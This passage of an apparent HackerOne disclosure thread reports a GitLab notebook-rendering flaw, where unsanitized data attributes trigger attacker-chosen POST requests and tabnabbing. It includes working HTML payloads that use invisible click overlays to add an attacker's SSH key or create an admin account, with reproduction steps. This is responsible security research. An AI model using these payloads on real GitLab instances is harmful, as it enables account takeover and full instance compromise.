      "message": "Hi again, thought that I could share my latest research into this.\n\nI have read through the code that is run as a part of the delayed initialization. I have not found any path leading to full XSS as long as the user controlled content that is to be displayed is loaded after the initial load. The delayed initialization contains the possibility of creating nav-bars, tooltips, popovers and more. The two obviously dangerous includes are\n\n#### Feature Highlight\n\n(https://gitlab.com/gitlab-org/gitlab/-/tree/master/app/assets/javascripts/feature_highlight) \n\nwith the dataset\n```\n  const { autoDevopsHelpPath, highlight: highlightId, dismissEndpoint } = el.dataset;\n```\nWhich will present the user with a popup when a user hovers over the blue dot that will replace the element with the js class `js-feature-highlight`. The popup contain a \"confirm\" button that on click will execute the function\n```\nexport function dismiss(endpoint, highlightId) {\n  return axios\n    .post(endpoint, {\n      feature_name: highlightId,\n    })\n    .catch(() =>\n    );\n}\n```\nAnd as the endpoint is controllable by the data-attribute `data-endpoint` which is not sanitized by DOMPurify we can make arbitrary post requests. This attack vector is usable but is not as \"versatile\" as the other one presented bellow. The feature highlight element is in my POC instead used to increase the success rate of the attack. As the feature highlight will replace the element on which we put the `js-feature-highlight` class we can add this class to a full screen link that will \"refresh\" the page on click and thus on the refresh mount the other payloads. When an attack mounts successfully the link will disappear and the underlying payloads will instead trigger on subsequent clicks.\n\n#### Persistent User Callouts\n\n(https://gitlab.com/gitlab-org/gitlab/-/blob/master/app/assets/javascripts/persistent_user_callouts.js)\n\nany of the following class-names will mount a persistent user callout to the DOM\n\n```\nconst PERSISTENT_USER_CALLOUTS = [\n  '.js-recovery-settings-callout',\n  '.js-users-over-license-callout',\n  '.js-admin-licensed-user-count-threshold',\n  '.js-buy-pipeline-minutes-notification-callout',\n  '.js-token-expiry-callout',\n  '.js-registration-enabled-callout',\n  '.js-new-user-signups-cap-reached',\n  '.js-eoa-bronze-plan-banner',\n  '.js-security-newsletter-callout',\n];\n```\n\nany element with one of these class-names will trigger the code in https://gitlab.com/gitlab-org/gitlab/-/blob/master/app/assets/javascripts/persistent_user_callout.js where we can control the dataset\n```\nconst { dismissEndpoint, featureId, deferLinks } = options;\n```\n\nBy data-attributes that will not get sanitized by DOMPurify. As with feature highlights there is a post request possible on click. This time we have two kind of events\n```\nconst closeButton = this.container.querySelector('.js-close');\nconst followLink = this.container.querySelector('.js-follow-link');\n```\nThe `followLink` will trigger a POST request which is followed by a link trigger if the element has an `href` attribute\n```\n    const { href } = event.currentTarget;\n\n    axios\n      .post(this.dismissEndpoint, {\n        feature_name: this.featureId,\n      })\n      .then(() => {\n        window.location.assign(href);\n```\n\nThe `closeButton` will instead allow us to add another selector to trigger searching the subtree for a link tag with the class-name `deffered-link` and then trigger this POST request\n```\naxios\n      .post(this.dismissEndpoint, {\n        feature_name: this.featureId,\n      })\n      .then(() => {\n        this.container.remove();\n\n        if (deferredLinkOptions) {\n          const { href, target } = deferredLinkOptions;\n          window.open(href, target);\n        }\n      })\n```\n\nWe can see here that the POST is instead followed by opening the link by `window.open`. As `target` is not allowed by DOMPurify this value will be `undefined`, the `window.open` will default to open the link in a new tab. As there is no `noopener` in the call (ex `window.open('https://www.your.url','_blank','noopener')`) this redirect can be used for \"Tabnabbing\".\n\n### Attack scenario\n\n```\n[\n\"<a class=\\\"js-feature-highlight\\\" style=\\\"background-color: rgba(0, 0, 0, 0); border: 0; cursor: default; height: 100%; left: 0; position: absolute; top: 0; width: 100%; z-index: 1001\\\">.</a>\",\n\n\"<div class=\\\"js-new-user-signups-cap-reached\\\"  data-dismiss-endpoint=\\\"PAYLOAD\" data-defer-links=\\\"true\\\" data-feature-id=\\\"1\\\">\",\n \n\"<a href=\\\"https://joaxcar.com\\\" style=\\\"background-color: rgba(0, 0, 0, 0); border: 0; cursor: default; height: 100%; left: 0; position: absolute; top: 0; width: 100%; z-index: 1000\\\" class=\\\"js-close deferred-link\\\">\",\n        \".\",\n    \"</a>\",\n\"</div>\"\n]\n```\nThis attack contains a \"refresh link\" and one subsequent POST attack. The POST attack can be expanded to trigger multiple POST requests as long as the victim continuous to click on the page. This is due to the fact that each triggered POST is a \"dismiss\" of the persistent callout. The attacker can thus \"stack\" multiple persistent callouts with lower z-index that will be exposed after successful triggers. I have recorded a video where I make 3 POST request and where only the last one has a  `deffered link` which opens a new tab, with witch I then performs a tabnabb.\n\nTo help with testing the POC I suggest using the POST request `users/:id/follow` instead of my initial `todo` example. Just put any ID in the link.\n\nTo mention two critical POSTs that are available to an attacker there is \"adding SSH key\" (https://docs.gitlab.com/ee/api/users.html#add-ssh-key) which will grant the attacker Git access to the users repositories. And the \"user creation\" (https://docs.gitlab.com/ee/api/users.html#user-creation) where an Admin can dreate other admins. The attacker can use the \"link\" functionality to send a request to its server to inform about a successful attack.\n\n██████\n\nThe POC is here\n{F1528205}\n\nBest regards\nJohan",
      "automated_response": false,
      "created_at": "2021-11-28T23:31:47.740Z",
      "updated_at": "2022-05-20T14:26:53.672Z",
      "actor": {
        "username": "joaxcar",
        "cleared": false,
        "verified": true,
        "url": "/joaxcar",
        "profile_picture_urls": {
          "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/9865qc9er7t2lratx5rgszbf3257/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89?response-content-disposition=inline%3B%20filename%3D%224FB38693-148C-4D50-BBCD-D726D3AE2B4F.jpeg%22%3B%20filename%2A%3DUTF-8%27%274FB38693-148C-4D50-BBCD-D726D3AE2B4F.jpeg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2ECAEJ7T%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T070255Z&X-Amz-Expires=2326&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQCDDxB3Q7XXN0MoClgzQmAHL%2B69tZPS%2BE24gR82nPqEdwIhANHQem4W9wXhLoFuofJDx%2FqAIGjY8c0SBI3ehY047uyzKrEFCCMQAxoMMDEzNjE5Mjc0ODQ5Igyma9oQLknRc2EMvTIqjgUdkBAFKeYB0BNxfLIf7yrAK9StAZOAVOqAB2nDAVvZzdGdBpPbafCMX5iFXBElENteTYhD1oHUWNwxHkgt5u5wkdb1iAfAk%2FDc45r%2BH68hwPWE4%2F4Eg9mj91Gun9FDT%2Fnix4%2FEA2ruJyu%2Fvv8ND3MdQJTBAb%2FEwMm37dxSUNFwZSPa5MB5rq7rxHkclV5GeZunw6wxjwnNKSWVzYIrega6azXoJKiHMO2LiXpow9VWmsyKGgoEVjCT3DrNFDLcDRAV7ZYYR%2FBtTEABLI6VBConZfyStVnLgIo3M0177TGG%2FEwQtxOc%2FlceHrcBhQ0l7g20BSRWTkcQdLfc5JjEvPfwN9EK9RZhIOZ26tEogh%2BE4wBA%2BGu1V59BSJEhNWRkZAMN4cfgvY00s%2B3lIi68i86n%2BXIinldM4hWHIi0WaKxhXr%2FBxJ3V7aB3pVfr8OPryPuZl2aTGClP4OHeLNIXiLLjXmPbDQ5rW4U6iO4bvWwQWAPij%2BIFWZMHk9aBT1tISa3sOSasbVTImEeMobt4kpKo%2BryuAcc3u3EyM2UBO5deDXG8FaXy7AA9sPIk42uvn1Rd2Ag6nUqz8GU25dMmhElHL0BU3XvBqc7imweolUyi5cWZHfaDsWKNcnXY8%2F8isxc3j6IfzvExaAAYTJtu7SSY4YpZM0ZSR7JnGK7nskqZPpcefIgtvsbRCB66vMGMLOEho1guaaKayJOP73YtV0HPPhVVzAYDHVc3s26zrlAnHXeqIC6pNt1mOGj%2BnQiGXmm9Agdxh0r0sgUCfCim%2BhnABVjU%2B3RbEn6e1WbqO2Q03ONg4c9OO3k4bR%2BCNvXJnN9UTE%2FRLA0cpWO4zvunZXEm8L9swIaU7CrIhAYCjI0w4v24qAY6sAGjzoEBIxaLDI6WGCHCkPMIuEHQ%2FgGwXuek3FzYMK5VklHKwExgNFnXkauQNdNGpARLJN0Cc6Fnp9zyBu5xmCMFjYPUxaVqEWLLoS1mYlcM8Pup6CI96cb%2B6dKTyHRivKTQECSe1yKBMEmrZgx2s7cqUkvEQEHk4RqiabnQJpgWjtZ5iYpbKCctjviGGkxvRRl4efqx5y77zgpojnaOfOyZyUY3%2BaxxrQU2c%2FcoK81iHg%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=12efbf8885958d54a685ad1d903301da963c3e23cbc470e4fa7d405220652c4e"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "attachments": [
        {
          "id": 1528205,
          "filename": "attack2.ipynb",
          "type": "application/octet-stream",
          "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/ya35qz2bi7otu219aigtpixe22d7?response-content-disposition=attachment%3B%20filename%3D%22attack2.ipynb%22%3B%20filename%2A%3DUTF-8%27%27attack2.ipynb&response-content-type=application%2Foctet-stream&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2ECAEJ7T%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T070255Z&X-Amz-Expires=2326&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQCDDxB3Q7XXN0MoClgzQmAHL%2B69tZPS%2BE24gR82nPqEdwIhANHQem4W9wXhLoFuofJDx%2FqAIGjY8c0SBI3ehY047uyzKrEFCCMQAxoMMDEzNjE5Mjc0ODQ5Igyma9oQLknRc2EMvTIqjgUdkBAFKeYB0BNxfLIf7yrAK9StAZOAVOqAB2nDAVvZzdGdBpPbafCMX5iFXBElENteTYhD1oHUWNwxHkgt5u5wkdb1iAfAk%2FDc45r%2BH68hwPWE4%2F4Eg9mj91Gun9FDT%2Fnix4%2FEA2ruJyu%2Fvv8ND3MdQJTBAb%2FEwMm37dxSUNFwZSPa5MB5rq7rxHkclV5GeZunw6wxjwnNKSWVzYIrega6azXoJKiHMO2LiXpow9VWmsyKGgoEVjCT3DrNFDLcDRAV7ZYYR%2FBtTEABLI6VBConZfyStVnLgIo3M0177TGG%2FEwQtxOc%2FlceHrcBhQ0l7g20BSRWTkcQdLfc5JjEvPfwN9EK9RZhIOZ26tEogh%2BE4wBA%2BGu1V59BSJEhNWRkZAMN4cfgvY00s%2B3lIi68i86n%2BXIinldM4hWHIi0WaKxhXr%2FBxJ3V7aB3pVfr8OPryPuZl2aTGClP4OHeLNIXiLLjXmPbDQ5rW4U6iO4bvWwQWAPij%2BIFWZMHk9aBT1tISa3sOSasbVTImEeMobt4kpKo%2BryuAcc3u3EyM2UBO5deDXG8FaXy7AA9sPIk42uvn1Rd2Ag6nUqz8GU25dMmhElHL0BU3XvBqc7imweolUyi5cWZHfaDsWKNcnXY8%2F8isxc3j6IfzvExaAAYTJtu7SSY4YpZM0ZSR7JnGK7nskqZPpcefIgtvsbRCB66vMGMLOEho1guaaKayJOP73YtV0HPPhVVzAYDHVc3s26zrlAnHXeqIC6pNt1mOGj%2BnQiGXmm9Agdxh0r0sgUCfCim%2BhnABVjU%2B3RbEn6e1WbqO2Q03ONg4c9OO3k4bR%2BCNvXJnN9UTE%2FRLA0cpWO4zvunZXEm8L9swIaU7CrIhAYCjI0w4v24qAY6sAGjzoEBIxaLDI6WGCHCkPMIuEHQ%2FgGwXuek3FzYMK5VklHKwExgNFnXkauQNdNGpARLJN0Cc6Fnp9zyBu5xmCMFjYPUxaVqEWLLoS1mYlcM8Pup6CI96cb%2B6dKTyHRivKTQECSe1yKBMEmrZgx2s7cqUkvEQEHk4RqiabnQJpgWjtZ5iYpbKCctjviGGkxvRRl4efqx5y77zgpojnaOfOyZyUY3%2BaxxrQU2c%2FcoK81iHg%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=26a8a679d15b8bbdcd971842d79971a2c96b681fe48d77df8bb61e1ab3a76846"
        }
      ],
      "genius_execution_id": null,
      "team_handle": "gitlab"
    },
    {
      "id": 14483520,
      "is_internal": false,
      "editable": false,
      "type": "Activities::BugNeedsMoreInfo",
      "message": "Hi @joaxcar,\n\nThank you for patiently answering our questions.\n\nI was able to reproduce this behaviour using the PoC you have provided in the report submission (the blue dot one). To justify the CVSS impact metrics set by you `Confidentiality = High` and `Integrity = High`, can you please provide a PoC that demonstrates creating an admin user by exploiting this vulnerability?\n\nI would love to take another look at your report once you have provided additional information supporting your issue.\n\nCheers,\n@forest_dweller",
      "automated_response": false,
      "created_at": "2021-11-30T10:04:18.829Z",
      "updated_at": "2021-11-30T10:04:18.829Z",
      "actor": {
        "username": "h1_analyst_amey",
        "cleared": false,
        "verified": false,
        "url": "/h1_analyst_amey",
        "profile_picture_urls": {
          "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/752nxtq8olqtr0zhu4h2jazs3137/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc?response-content-disposition=inline%3B%20filename%3D%22kimo-pZYzGNUgWbY-unsplash%20%25281%2529.jpg%22%3B%20filename%2A%3DUTF-8%27%27kimo-pZYzGNUgWbY-unsplash%2520%25281%2529.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2ECAEJ7T%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T070255Z&X-Amz-Expires=2326&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQCDDxB3Q7XXN0MoClgzQmAHL%2B69tZPS%2BE24gR82nPqEdwIhANHQem4W9wXhLoFuofJDx%2FqAIGjY8c0SBI3ehY047uyzKrEFCCMQAxoMMDEzNjE5Mjc0ODQ5Igyma9oQLknRc2EMvTIqjgUdkBAFKeYB0BNxfLIf7yrAK9StAZOAVOqAB2nDAVvZzdGdBpPbafCMX5iFXBElENteTYhD1oHUWNwxHkgt5u5wkdb1iAfAk%2FDc45r%2BH68hwPWE4%2F4Eg9mj91Gun9FDT%2Fnix4%2FEA2ruJyu%2Fvv8ND3MdQJTBAb%2FEwMm37dxSUNFwZSPa5MB5rq7rxHkclV5GeZunw6wxjwnNKSWVzYIrega6azXoJKiHMO2LiXpow9VWmsyKGgoEVjCT3DrNFDLcDRAV7ZYYR%2FBtTEABLI6VBConZfyStVnLgIo3M0177TGG%2FEwQtxOc%2FlceHrcBhQ0l7g20BSRWTkcQdLfc5JjEvPfwN9EK9RZhIOZ26tEogh%2BE4wBA%2BGu1V59BSJEhNWRkZAMN4cfgvY00s%2B3lIi68i86n%2BXIinldM4hWHIi0WaKxhXr%2FBxJ3V7aB3pVfr8OPryPuZl2aTGClP4OHeLNIXiLLjXmPbDQ5rW4U6iO4bvWwQWAPij%2BIFWZMHk9aBT1tISa3sOSasbVTImEeMobt4kpKo%2BryuAcc3u3EyM2UBO5deDXG8FaXy7AA9sPIk42uvn1Rd2Ag6nUqz8GU25dMmhElHL0BU3XvBqc7imweolUyi5cWZHfaDsWKNcnXY8%2F8isxc3j6IfzvExaAAYTJtu7SSY4YpZM0ZSR7JnGK7nskqZPpcefIgtvsbRCB66vMGMLOEho1guaaKayJOP73YtV0HPPhVVzAYDHVc3s26zrlAnHXeqIC6pNt1mOGj%2BnQiGXmm9Agdxh0r0sgUCfCim%2BhnABVjU%2B3RbEn6e1WbqO2Q03ONg4c9OO3k4bR%2BCNvXJnN9UTE%2FRLA0cpWO4zvunZXEm8L9swIaU7CrIhAYCjI0w4v24qAY6sAGjzoEBIxaLDI6WGCHCkPMIuEHQ%2FgGwXuek3FzYMK5VklHKwExgNFnXkauQNdNGpARLJN0Cc6Fnp9zyBu5xmCMFjYPUxaVqEWLLoS1mYlcM8Pup6CI96cb%2B6dKTyHRivKTQECSe1yKBMEmrZgx2s7cqUkvEQEHk4RqiabnQJpgWjtZ5iYpbKCctjviGGkxvRRl4efqx5y77zgpojnaOfOyZyUY3%2BaxxrQU2c%2FcoK81iHg%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=5a47a02b9c661dbe00b459808e015707a6c03d1b46a916c59c5fd6daaf9e22fe"
        },
        "hackerone_triager": true,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "gitlab"
    },
    {
      "id": 14485094,
      "is_internal": false,
      "editable": false,
      "type": "Activities::BugNew",
      "message": "Hi @forest_dweller thank you for looking into the report!\n\nFirst I will submit a POC recording of adding an SSH key to any user. I hope the recording is submitted (had some problems with H1 recording tool). Assigning an SSH key to a user involves first generating a new unique fingerprint and then planting it in the payload as part of the API call\n```\nhttps://gitlab.com/api/v4/user/keys?title=hack&key=ssh-ed25519%20AAAAC3NzaC1lZDI1NTE5AAAAIDpz7b7pozVlAnzLfWhrAB7wUAPce0KcfY9ZsS4TIpkW%20jcar@MINDARO\n```\nThis payload is only valid once as no two keys can have the same fingerprint on GitLab. Here an attacker can use the fact that the victim can get redirected after successful payload trigger. When the attacker gets a visit on the linked site it could automatically generate a new SSH key and update the payload for the next victim. This could all be automated.\n\n### Steps to reproduce\n\n1. Generate an SSH key (on linux use `ssh-keygen -t ed25519`) give it a name and skip passphrase on this one.\n2. Copy the content of the generated KEY.pub file and URL encode it (use the devtools terminal to run `encodeURI(\"SSHKEY FINGERPRINT\")`)\n3. Use one of the POC files from before but replace the text/html cell with this content\n```\n\"text/html\": [\n              \"<a href=\\\"https://gitlab.com/joaxcar-test03/joaxcar-test03/-/blob/main/test6.ipynb\\\" class=\\\"js-feature-highlight\\\" data-dismiss-endpoint=\\\"https://gitlab.com/api/v4/todos/147611488/mark_as_done\\\" data-auto-devops-help-path=\\\"hej\\\" data-highlight-id=\\\"1\\\" style=\\\"background-color: rgba(0, 0, 0, 0); border: 0; cursor: default; height: 100%; left: 0; position: absolute; top: 0; width: 100%; z-index: 1001\\\">.</a>\",\n            \"<div class=\\\"js-new-user-signups-cap-reached\\\" data-dismiss-endpoint=\\\"https://gitlab.com/api/v4/user/keys?title=hack&key=ssh-ed25519%20AAAAC3NzaC1lZDI1NTE5AAAAIJTZP4fwLYfa5geVE8Ynj3GEH6n82NEet0wvD201B4X0%20jcar@MINDARO\\\" data-defer-links=\\\"false\\\" data-feature-id=\\\"1\\\">\",\n            \"<button style=\\\"background-color: rgba(0, 0, 0, 0); border: 0; cursor: default; height: 100%; left: 0; position: absolute; top: 0; width: 100%; z-index: 1000\\\" class=\\\"js-close\\\">\",\n            \"hack\",\n            \"</button>\",\n            \"</div>\"\n            ]},\n```\nreplacing the ssh-key.\n4. Save and reload and click on the page\n5. You should now have a SSH key on your user named hack. see https://gitlab.com/-/profile/keys\n\nWill post the admin one soon",
      "automated_response": false,
      "created_at": "2021-11-30T11:02:03.456Z",
      "updated_at": "2021-11-30T11:02:03.456Z",
      "actor": {
        "username": "joaxcar",
        "cleared": false,
        "verified": true,
        "url": "/joaxcar",
        "profile_picture_urls": {
          "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/9865qc9er7t2lratx5rgszbf3257/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89?response-content-disposition=inline%3B%20filename%3D%224FB38693-148C-4D50-BBCD-D726D3AE2B4F.jpeg%22%3B%20filename%2A%3DUTF-8%27%274FB38693-148C-4D50-BBCD-D726D3AE2B4F.jpeg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2ECAEJ7T%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T070255Z&X-Amz-Expires=2326&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQCDDxB3Q7XXN0MoClgzQmAHL%2B69tZPS%2BE24gR82nPqEdwIhANHQem4W9wXhLoFuofJDx%2FqAIGjY8c0SBI3ehY047uyzKrEFCCMQAxoMMDEzNjE5Mjc0ODQ5Igyma9oQLknRc2EMvTIqjgUdkBAFKeYB0BNxfLIf7yrAK9StAZOAVOqAB2nDAVvZzdGdBpPbafCMX5iFXBElENteTYhD1oHUWNwxHkgt5u5wkdb1iAfAk%2FDc45r%2BH68hwPWE4%2F4Eg9mj91Gun9FDT%2Fnix4%2FEA2ruJyu%2Fvv8ND3MdQJTBAb%2FEwMm37dxSUNFwZSPa5MB5rq7rxHkclV5GeZunw6wxjwnNKSWVzYIrega6azXoJKiHMO2LiXpow9VWmsyKGgoEVjCT3DrNFDLcDRAV7ZYYR%2FBtTEABLI6VBConZfyStVnLgIo3M0177TGG%2FEwQtxOc%2FlceHrcBhQ0l7g20BSRWTkcQdLfc5JjEvPfwN9EK9RZhIOZ26tEogh%2BE4wBA%2BGu1V59BSJEhNWRkZAMN4cfgvY00s%2B3lIi68i86n%2BXIinldM4hWHIi0WaKxhXr%2FBxJ3V7aB3pVfr8OPryPuZl2aTGClP4OHeLNIXiLLjXmPbDQ5rW4U6iO4bvWwQWAPij%2BIFWZMHk9aBT1tISa3sOSasbVTImEeMobt4kpKo%2BryuAcc3u3EyM2UBO5deDXG8FaXy7AA9sPIk42uvn1Rd2Ag6nUqz8GU25dMmhElHL0BU3XvBqc7imweolUyi5cWZHfaDsWKNcnXY8%2F8isxc3j6IfzvExaAAYTJtu7SSY4YpZM0ZSR7JnGK7nskqZPpcefIgtvsbRCB66vMGMLOEho1guaaKayJOP73YtV0HPPhVVzAYDHVc3s26zrlAnHXeqIC6pNt1mOGj%2BnQiGXmm9Agdxh0r0sgUCfCim%2BhnABVjU%2B3RbEn6e1WbqO2Q03ONg4c9OO3k4bR%2BCNvXJnN9UTE%2FRLA0cpWO4zvunZXEm8L9swIaU7CrIhAYCjI0w4v24qAY6sAGjzoEBIxaLDI6WGCHCkPMIuEHQ%2FgGwXuek3FzYMK5VklHKwExgNFnXkauQNdNGpARLJN0Cc6Fnp9zyBu5xmCMFjYPUxaVqEWLLoS1mYlcM8Pup6CI96cb%2B6dKTyHRivKTQECSe1yKBMEmrZgx2s7cqUkvEQEHk4RqiabnQJpgWjtZ5iYpbKCctjviGGkxvRRl4efqx5y77zgpojnaOfOyZyUY3%2BaxxrQU2c%2FcoK81iHg%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=12efbf8885958d54a685ad1d903301da963c3e23cbc470e4fa7d405220652c4e"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "gitlab"
    },
    {
      "id": 14485577,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "A new recording, hope the POC is clear enough. There are some SSH keys that are not compatible with getting sent in the url parameters so I use one that I know work. If the payload says that the fingerprint is taken, just generate a new one!\n\n█████",
      "automated_response": false,
      "created_at": "2021-11-30T11:24:26.847Z",
      "updated_at": "2022-05-20T14:26:42.825Z",
      "actor": {
        "username": "joaxcar",
        "cleared": false,
        "verified": true,
        "url": "/joaxcar",
        "profile_picture_urls": {
          "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/9865qc9er7t2lratx5rgszbf3257/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89?response-content-disposition=inline%3B%20filename%3D%224FB38693-148C-4D50-BBCD-D726D3AE2B4F.jpeg%22%3B%20filename%2A%3DUTF-8%27%274FB38693-148C-4D50-BBCD-D726D3AE2B4F.jpeg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2ECAEJ7T%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T070255Z&X-Amz-Expires=2326&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQCDDxB3Q7XXN0MoClgzQmAHL%2B69tZPS%2BE24gR82nPqEdwIhANHQem4W9wXhLoFuofJDx%2FqAIGjY8c0SBI3ehY047uyzKrEFCCMQAxoMMDEzNjE5Mjc0ODQ5Igyma9oQLknRc2EMvTIqjgUdkBAFKeYB0BNxfLIf7yrAK9StAZOAVOqAB2nDAVvZzdGdBpPbafCMX5iFXBElENteTYhD1oHUWNwxHkgt5u5wkdb1iAfAk%2FDc45r%2BH68hwPWE4%2F4Eg9mj91Gun9FDT%2Fnix4%2FEA2ruJyu%2Fvv8ND3MdQJTBAb%2FEwMm37dxSUNFwZSPa5MB5rq7rxHkclV5GeZunw6wxjwnNKSWVzYIrega6azXoJKiHMO2LiXpow9VWmsyKGgoEVjCT3DrNFDLcDRAV7ZYYR%2FBtTEABLI6VBConZfyStVnLgIo3M0177TGG%2FEwQtxOc%2FlceHrcBhQ0l7g20BSRWTkcQdLfc5JjEvPfwN9EK9RZhIOZ26tEogh%2BE4wBA%2BGu1V59BSJEhNWRkZAMN4cfgvY00s%2B3lIi68i86n%2BXIinldM4hWHIi0WaKxhXr%2FBxJ3V7aB3pVfr8OPryPuZl2aTGClP4OHeLNIXiLLjXmPbDQ5rW4U6iO4bvWwQWAPij%2BIFWZMHk9aBT1tISa3sOSasbVTImEeMobt4kpKo%2BryuAcc3u3EyM2UBO5deDXG8FaXy7AA9sPIk42uvn1Rd2Ag6nUqz8GU25dMmhElHL0BU3XvBqc7imweolUyi5cWZHfaDsWKNcnXY8%2F8isxc3j6IfzvExaAAYTJtu7SSY4YpZM0ZSR7JnGK7nskqZPpcefIgtvsbRCB66vMGMLOEho1guaaKayJOP73YtV0HPPhVVzAYDHVc3s26zrlAnHXeqIC6pNt1mOGj%2BnQiGXmm9Agdxh0r0sgUCfCim%2BhnABVjU%2B3RbEn6e1WbqO2Q03ONg4c9OO3k4bR%2BCNvXJnN9UTE%2FRLA0cpWO4zvunZXEm8L9swIaU7CrIhAYCjI0w4v24qAY6sAGjzoEBIxaLDI6WGCHCkPMIuEHQ%2FgGwXuek3FzYMK5VklHKwExgNFnXkauQNdNGpARLJN0Cc6Fnp9zyBu5xmCMFjYPUxaVqEWLLoS1mYlcM8Pup6CI96cb%2B6dKTyHRivKTQECSe1yKBMEmrZgx2s7cqUkvEQEHk4RqiabnQJpgWjtZ5iYpbKCctjviGGkxvRRl4efqx5y77zgpojnaOfOyZyUY3%2BaxxrQU2c%2FcoK81iHg%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=12efbf8885958d54a685ad1d903301da963c3e23cbc470e4fa7d405220652c4e"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "gitlab"
    },
    {
      "id": 14486691,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "@forest_dweller and here is the admin POC. This one is done on my local instance but should work the same on GitLab.com if I had an admin account there :)\n\nedit: This POC requires the victim user to be an admin\n\n████\n\nUse the same base .ipynb file but replace the content of the infected cell to\n```\n\"text/html\": [\n              \"<a href=\\\"https://gitlab.example.com/user_02/asdasd/-/blob/main/test.ipynb\\\" class=\\\"js-feature-highlight\\\" data-dismiss-endpoint=\\\"https://gitlab.com/api/v4/todos/147611488/mark_as_done\\\" data-auto-devops-help-path=\\\"hej\\\" data-highlight-id=\\\"1\\\" style=\\\"background-color: rgba(0, 0, 0, 0); border: 0; cursor: default; height: 100%; left: 0; position: absolute; top: 0; width: 100%; z-index: 1001\\\">.</a>\",\n            \"<div class=\\\"js-new-user-signups-cap-reached\\\" data-dismiss-endpoint=\\\"https://gitlab.example.com/api/v4/users?admin=true&email=joaxcar@wearehackerone.com&name=newadmin&username=newadmin&password=asdasdasdasd&skip_confirmation=true\\\" data-defer-links=\\\"false\\\" data-feature-id=\\\"1\\\">\",\n            \"<button style=\\\"background-color: rgba(0, 0, 0, 0); border: 0; cursor: default; height: 100%; left: 0; position: absolute; top: 0; width: 100%; z-index: 1000\\\" class=\\\"js-close\\\">\",\n            \"hack\",\n            \"</button>\",\n            \"</div>\"\n            ]}\n```\nThe first part is a \"refresher\" again (I also forgot to mention that it is important to update this link to point at the current file, so that you dont end up at another file when refreshing). The second part makes a call to the endpoint\n```\nhttps://gitlab.example.com/api/v4/users?admin=true&email=joaxcar@wearehackerone.com&name=newadmin&username=newadmin&password=asdasdasdasd&skip_confirmation=true\n```\nwhich will create a new user that is an admin and already activated (skip_confirmation). Now the attacker have full access to the instance. Again a trailing redirect could be used to notify the attacker that the payload was successful.\n\nIf there is anything more I can add just reach out again.\n\nBest regards\nJohan",
      "automated_response": false,
      "created_at": "2021-11-30T12:10:09.708Z",
      "updated_at": "2022-05-20T14:26:48.857Z",
      "actor": {
        "username": "joaxcar",
        "cleared": false,
        "verified": true,
        "url": "/joaxcar",
        "profile_picture_urls": {
          "medium": 